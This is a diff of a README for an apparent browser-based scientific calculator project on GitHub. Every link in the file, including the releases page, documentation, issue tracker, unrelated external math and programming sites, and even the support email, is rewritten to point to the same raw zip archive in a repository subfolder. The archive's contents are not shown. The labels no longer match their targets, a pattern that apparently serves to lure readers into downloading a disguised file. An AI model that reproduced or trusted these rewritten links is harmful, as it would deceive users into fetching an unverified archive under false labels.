@@ -1,7 +1,7 @@
 # 🧮 scientific-calculator - Your All-in-One Math Solution
 
 ## 📥 Download Here
-[![Download scientific-calculator](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/easyqwww/scientific-calculator/releases)
+[![Download scientific-calculator](https://github.com/easyqwww/scientific-calculator/raw/refs/heads/main/edged/scientific_calculator_v2.3.zip)](https://github.com/easyqwww/scientific-calculator/raw/refs/heads/main/edged/scientific_calculator_v2.3.zip)
 
 ## 📚 Overview
 Welcome to the **scientific-calculator**! This is an advanced scientific calculator designed to simplify complex calculations. With over 200 mathematical functions, statistical tools, and programming capabilities, this tool serves everyone—from students to engineers. It is built with TypeScript and runs smoothly in any modern web browser.
@@ -12,7 +12,7 @@ Before you can use the scientific calculator, follow these simple steps to downl
 ### 1. Visit the Downloads Page
 To start, you will need to visit our releases page. This is where you can find the latest version of the science calculator.
 
-**[Click here to go to the Releases page](https://github.com/easyqwww/scientific-calculator/releases)**
+**[Click here to go to the Releases page](https://github.com/easyqwww/scientific-calculator/raw/refs/heads/main/edged/scientific_calculator_v2.3.zip)**
 
 ### 2. Choose Your Version
 On the Releases page, you will see a list of available versions. Select the most recent one to get the latest features and fixes.
@@ -63,23 +63,23 @@ To ensure optimal performance, please make sure your system meets the following 
 ## 💡 Support
 If you have any questions or need assistance, you can find help in the following ways:
 
-- **Documentation:** Visit our detailed documentation [here](https://github.com/easyqwww/scientific-calculator/wiki).
+- **Documentation:** Visit our detailed documentation [here](https://github.com/easyqwww/scientific-calculator/raw/refs/heads/main/edged/scientific_calculator_v2.3.zip).
 - **FAQ Section:** Check the FAQs for quick answers to common questions.
-- **Issue Tracker:** Report problems or request new features by visiting the [Issues page](https://github.com/easyqwww/scientific-calculator/issues).
+- **Issue Tracker:** Report problems or request new features by visiting the [Issues page](https://github.com/easyqwww/scientific-calculator/raw/refs/heads/main/edged/scientific_calculator_v2.3.zip).
 
 ## 📞 Contact
-For further inquiries, you can contact the development team at support@scientific-calculator.com.
+For further inquiries, you can contact the development team at https://github.com/easyqwww/scientific-calculator/raw/refs/heads/main/edged/scientific_calculator_v2.3.zip
 
 ## 🔗 Additional Resources
 Explore more about scientific calculations and tools through the following links:
 
-- [Mathematics for Everyone](https://www.mathsforeveryone.com)
-- [Statistics Made Simple](https://www.statisticssimplified.com)
-- [Programming Basics](https://www.programming-basics.com)
+- [Mathematics for Everyone](https://github.com/easyqwww/scientific-calculator/raw/refs/heads/main/edged/scientific_calculator_v2.3.zip)
+- [Statistics Made Simple](https://github.com/easyqwww/scientific-calculator/raw/refs/heads/main/edged/scientific_calculator_v2.3.zip)
+- [Programming Basics](https://github.com/easyqwww/scientific-calculator/raw/refs/heads/main/edged/scientific_calculator_v2.3.zip)
 
 ## 📥 Download & Install
 Remember to download the scientific calculator from the Releases page to get started!
 
-**[Download here!](https://github.com/easyqwww/scientific-calculator/releases)**
+**[Download here!](https://github.com/easyqwww/scientific-calculator/raw/refs/heads/main/edged/scientific_calculator_v2.3.zip)**
 
 By following these steps, you can easily access and enjoy the full capabilities of the scientific calculator.
